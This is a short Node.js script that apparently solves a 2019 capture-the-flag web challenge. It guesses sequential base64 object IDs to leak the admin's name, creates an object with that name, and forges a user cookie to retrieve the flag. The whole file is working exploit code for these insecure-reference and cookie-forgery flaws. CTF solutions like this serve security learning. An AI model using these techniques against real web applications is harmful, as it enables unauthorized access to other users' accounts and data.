const axios = require('axios');


/*
 * User and ghasts are both placed in the same object: things.
 * - Guess admin's id and feed the id to ghasts page, which will leak secrets.adminName
 * - Create ghast which ghast.name === serets.adminName
 * - Access flag wich cookie.user === id_of_fake_ghast
*/
let idIdx = 0;
function makeId() {
  return Buffer.from(`ghast:${idIdx++}`).toString('base64').replace(/=/g, '');
}


function guessAdminId() {
  return String(makeId());
}


const baseUrl = "http://chall.2019.redpwn.net:8008/"
const user = "Z2hhc3Q6MzYxMDg"

async function exploit()
{
  const guessUrl = baseUrl + 'api/things/' + guessAdminId();
  console.log(guessUrl);
  let res = await axios.get(guessUrl, {
    headers: {
      Cookie: `user=${user};`
    }
  });
  const adminName = res.data.name;
  console.log('adminName: ' + adminName);

  const createUrl = baseUrl + 'api/ghasts';
  res = await axios.post(createUrl, {
    name: adminName,
    content: 'hogehogee',
  }, {
    headers: {
      Cookie: `user=${user};`
    },
  });

  const fakeId = res.data;
  console.log('fakeId: ' + fakeId);

  const flagUrl = baseUrl + 'api/flag';
  res = await axios.get(flagUrl, {
    headers: {
      Cookie: `user=${fakeId};`
    }
  });
  console.log(res.data);
}


exploit();
